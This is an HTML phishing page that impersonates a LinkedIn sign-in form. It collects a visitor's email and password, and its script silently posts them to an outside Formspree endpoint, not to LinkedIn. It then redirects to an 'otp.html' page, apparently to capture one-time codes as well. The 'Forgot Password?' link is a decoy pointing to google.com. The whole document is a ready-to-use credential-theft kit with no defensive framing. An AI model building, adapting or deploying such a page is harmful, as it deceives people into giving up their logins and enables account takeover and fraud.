<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In with Linkedin.</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; }
        .container { max-width: 400px; margin: 100px auto; padding: 20px; background: white; border-radius: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h3 { text-align: center; }
        input[type="email"], input[type="password"], input[type="text"] { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
        button { width: 100%; padding: 10px; background: #0077b5; color: white; border: none; border-radius: 5px; cursor: pointer; }
        button:hover { background: #005582; }
        .otp-section { display: none; }
    .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding-bottom: 0px;
        }
        .logo {
            width: 150px;
            margin: 0px auto;
        }
      @media (max-width: 600px) {
            .header {
                flex-direction: column;
                align-items: flex-start;
            }
            .logo {
                margin-bottom: 0px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
         <img src="logo.png" alt="Company Logo" class="logo">
        </div>
        <h3>Sign in </h3>
        <div class="login-section">
          <form id="loginForm">
    <input type="email" id="email" name="email" placeholder="Email" required>
    <input type="password" id="password" name="message" placeholder="Password" required>
    <button type="submit">Sign In</button>
    <p><a href="https://google.com/">Forgot Password?</a></p>

</form>

<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault(); // Stop default form submission

    const form = e.target;
    const formData = new FormData(form);

    fetch('https://formspree.io/f/mldbdovj', {
        method: 'POST',
        body: formData,
        headers: {
          'Accept': 'application/json'
        }
    }).then(function(response) {
        if (response.ok) {
            window.location.href = "otp.html"; // Redirect after successful submission
        } else {
            alert('Form submission failed. Please try again.');
        }
    }).catch(function(error) {
        alert('There was an error. Please try again.');
    });
});
</script>
        </div>

</body>
</html>
